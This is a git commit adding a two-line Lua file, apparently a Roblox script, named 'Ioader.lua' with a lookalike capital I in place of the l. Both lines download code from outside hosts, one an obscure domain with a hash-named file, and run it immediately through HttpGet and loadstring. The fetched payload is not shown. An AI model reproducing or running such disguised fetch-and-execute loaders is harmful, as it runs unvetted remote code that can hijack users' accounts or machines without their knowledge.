529461ac739109d7ecc3c6ce75d515649ea9efee
azurkxo <140209544+azurkxo@users.noreply.github.com>
2024-12-29 23:50:21 +0200

    Add files via upload

---
+++ Ioader.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://egorikusa.space/4db2cdaf73db827f775b5a6e.lua", true))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring'))()
